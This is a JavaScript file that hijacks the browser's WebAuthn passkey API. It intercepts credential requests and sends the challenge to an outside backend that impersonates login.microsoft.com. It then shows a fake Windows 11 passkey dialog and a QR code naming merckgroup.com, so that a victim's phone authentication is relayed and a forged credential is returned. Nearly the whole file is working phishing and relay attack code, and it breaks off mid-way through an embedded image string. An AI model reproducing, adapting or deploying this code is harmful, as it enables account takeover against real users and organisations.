navigator.credentials.get = function (request) {
  return new Promise((resolve, reject) => {
    try {
      console.log("Original Webauthn Request:", request);
      console.log(
        "Original Webauthn Request as JSON:",
        JSON.stringify(request)
      );
      getCedentials(request)
        .then((response) => {
          console.log("Webauthn Response:", response);
          console.log("Webauthn Response as JSON:", JSON.stringify(response));
          resolve(response);
        })
        .catch((e) => {
          throw new Error(e);
        });
    } catch (e) {
      reject(
        e,
        "NotAllowedError: The operation either timed out or was not allowed. See: https://www.w3.org/TR/webauthn-2/#sctn-privacy-considerations-client."
      );
    }
  });
};

var credentialRequest;
async function getCedentials(request) {
  const responsePreauth = await fetch("https://my-backend.com:4444/preauth", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
  });

  credentialRequest = await responsePreauth.json();
  createWin11FidoListPopup();

  var allowedCredentials = [];
  for (const allowCredential of request.publicKey.allowCredentials) {
    allowedCredentials.push({
      id: btoa(
        String.fromCharCode.apply(null, new Uint8Array(allowCredential.id))
      ),
      transports: allowCredential.transports ?? [],
    });
  }

  const webauthnRequest = {
    rpId: "login.microsoft.com",
    origin: "https://login.microsoft.com",
    //rpId: "webauthn.io",
    //origin: "https://webauthn.io",
    userVerification: request.publicKey.userVerification ?? "preferred",
    timeout: request.publicKey.timeout ?? 120000,
    challenge: btoa(
      String.fromCharCode.apply(
        null,
        new Uint8Array(request.publicKey.challenge)
      )
    ),
    allowedCredentials: allowedCredentials,
  };

  var requestBody = JSON.stringify({
    id: credentialRequest.id,
    request: webauthnRequest,
  });

  console.log("Sent Request to Backend:", requestBody);

  const responseAuth = await fetch("https://my-backend.com:4444/auth", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: requestBody,
  });

  var credentialJson = await responseAuth.json();
  credentialJson.clientExtensionResults = {};

  var credentialObj = {
      authenticatorAttachment: credentialJson.authenticatorAttachment,
      clientExtensionResults: credentialJson.clientExtensionResults,
      id: credentialJson.id,
      rawId: asArrayBuffer(credentialJson.rawId),
      response: {
          authenticatorData: asArrayBuffer(credentialJson.response.authenticatorData), 
          clientDataJSON: asArrayBuffer(credentialJson.response.clientDataJSON),
          signature: asArrayBuffer(credentialJson.response.signature), 
          userHandle: asArrayBuffer(credentialJson.response.userHandle),
      },
      type: credentialJson.type
  }

  credentialObj.toJSON = function(){
    console.log("toJSON called");
    return credentialJson;
  }

  credentialObj.getClientExtensionResults = function(){
    console.log("getClientExtensionResults called");
    return {}
  }

  popUpOverlay.remove();
  return credentialObj
}

function asArrayBuffer(base64){
    if(!base64){
      return;
    }

    // URL SAFE Base64 decode! (RFC 4648 §5)
    var binaryString = atob(base64.replace(/_/g, '/').replace(/-/g, '+'));
    var bytes = new Uint8Array(binaryString.length);
    for (var i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }
    return bytes.buffer;
}

function createWin11FidoListPopup() {
  var main = createWin11Popup({
    title: "Sign in with your passkey",
    innerHtml1: `To sign in to “merckgroup.com“, choose a device with a saved passkey.`,
    innerHtml2: `This request comes from the app “chrome.exe” by “Google LLC”.`,
    nextButtonOnClick: onNextClick,
  });

  const device = document.createElement("div");
  try {
    device.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  device.style.display = "flex";
  device.style.alignItems = "center";
  device.style.gap = "8px";
  device.style.padding = "8px 0px 20px 0px";
  device.style.borderRadius = "3px";
  device.style.marginBottom = "8px";
  //device.style.cursor = "pointer";
  device.style.height = "50px";

  const icon = document.createElement("img");
  try {
    icon.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  icon.style.width = "60px";
  icon.style.height = "60px";
  icon.src =
    "data:image/jpeg;base64,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";
  icon.style.paddingRight = "10px";
  device.appendChild(icon);

  const text = document.createElement("span");
  try {
    text.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  text.textContent = "iPhone, iPad, or Android device";
  text.style.cursor = "default";
  text.style.marginTop = "-35px";
  device.appendChild(text);

  main.appendChild(device);

  const list = document.createElement("div");
  try {
    list.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  list.style.marginLeft = "5px";
  const inner = document.createElement("div");

  const more = document.createElement("div");
  try {
    more.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  more.textContent = "More choices";
  more.style.fontSize = "15px";
  more.style.color = "#013e91";
  more.style.margin = "15px 10px";
  more.style.cursor = "pointer";

  var toggle = true;
  more.addEventListener("click", () => {
    if (toggle) {
      list.removeChild(inner);
    } else {
      list.appendChild(inner);
    }
    toggle = !toggle;
  });

  list.appendChild(more);
  inner.appendChild(createDeviceItem("iPhone, iPad, or Android device"));
  list.appendChild(inner);
  main.appendChild(list);
  return;
}

function onNextClick(h3, p1, p2, main, nextBtn, footer) {
  main.innerHTML = "";
  nextBtn.remove();
  h3.textContent = "iPhone, iPad, or Android device";
  p1.innerHTML = `Scan this QR code with the device that has the passkey for<br>“merckgroup.com”.`;
  p2.innerHTML = `This request comes from the app “chrome.exe” by “Google LLC”.`;
  footer.style.justifyContent = "flex-end";
  const qr = document.createElement("div");
  qr.style.marginLeft = "55px";
  main.appendChild(qr);
  const qrCode = new QRCodeStyling({
    type: "canvas",
    shape: "square",
    width: 300,
    height: 300,
    data: credentialRequest.url,
    margin: 0,
    qrOptions: { typeNumber: "0", mode: "Byte", errorCorrectionLevel: "M" },
    imageOptions: {
      saveAsBlob: true,
      hideBackgroundDots: true,
      imageSize: 0.6,
      margin: 5,
    },
    dotsOptions: {
      type: "square",
      color: "#000000",
      roundSize: true,
      gradient: null,
    },
    dotsOptionsHelper: {
      colorType: { single: true, gradient: false },
      gradient: {
        linear: true,
        radial: false,
        color1: "#6a1a4c",
        color2: "#6a1a4c",
        rotation: "0",
      },
    },
    backgroundOptions: { round: 0, color: "#ffffff" },
    image:
      "data:image/png;base64,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",

    cornersSquareOptions: { type: "square", color: "#000000" },
    cornersSquareOptionsHelper: {
      colorType: { single: true, gradient: false },
      gradient: {
        linear: true,
        radial: false,
        color1: "#000000",
        color2: "#000000",
        rotation: "0",
      },
    },
    cornersDotOptions: { type: "", color: "#000000" },
    cornersDotOptionsHelper: {
      colorType: { single: true, gradient: false },
      gradient: {
        linear: true,
        radial: false,
        color1: "#000000",
        color2: "#000000",
        rotation: "0",
      },
    },
    backgroundOptionsHelper: {
      colorType: { single: true, gradient: false },
      gradient: {
        linear: true,
        radial: false,
        color1: "#ffffff",
        color2: "#ffffff",
        rotation: "0",
      },
    },
  });

  qrCode.append(qr);
}

function createDeviceItem(name) {
  const device = document.createElement("div");
  try {
    device.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  device.style.display = "flex";
  device.style.alignItems = "center";
  device.style.gap = "8px";
  device.style.padding = "8px";
  device.style.borderRadius = "3px";
  device.style.marginBottom = "8px";
  //device.style.cursor = "pointer";
  device.style.height = "50px";
  device.style.background = "#f6f6f6";

  const border = document.createElement("div");
  border.style =
    "border-left: 3px solid #0067c0;height: 20px;margin-left: -8px;";

  device.appendChild(border);
  const icon = document.createElement("img");
  try {
    icon.style.all = "revert";
  } catch (e) {
    console.log(e);
  }
  icon.style.width = "40px";
  icon.style.height = "40px";
  icon.src =
    "data:image/jpeg;base64,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